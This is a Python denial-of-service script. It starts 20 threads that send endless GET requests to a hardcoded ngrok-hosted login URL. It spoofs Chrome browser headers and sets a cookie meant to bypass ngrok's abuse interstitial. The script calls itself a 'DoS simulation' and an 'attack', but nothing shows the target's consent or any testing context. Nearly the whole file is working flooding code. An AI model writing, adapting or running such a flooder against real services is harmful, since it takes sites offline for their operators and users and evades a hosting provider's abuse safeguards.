import threading
import requests
import time

# -------- CONFIGURATION --------
TARGET_URL = "https://ccdb-31-205-106-14.ngrok-free.app/login"
NUM_THREADS = 20  # Number of threads to simulate concurrent requests

HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'zh-CN,zh;q=0.9',
    'cache-control': 'max-age=0',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Cookie': 'abuse_interstitial=ccdb-31-205-106-14.ngrok-free.app'
}


# -------- FUNCTION FOR EACH THREAD --------
def flood():
    while True:
        try:
            response = requests.get(TARGET_URL, headers=HEADERS, timeout=5)
            print(f"[{threading.current_thread().name}] Status Code: {response.status_code}")
        except Exception as e:
            print(f"[{threading.current_thread().name}] Error: {str(e)}")
        # time.sleep(0.1)  # Uncomment to slow down the requests


# -------- START THREADS --------
if __name__ == '__main__':
    print(f"🚀 Starting DoS simulation on {TARGET_URL} with {NUM_THREADS} threads...\n")
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood, name=f"Thread-{i+1}")
        t.daemon = True  # Make the thread a daemon so it will exit when the main program exits
        t.start()

    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            print("🛑 Stopping attack manually.")
            break
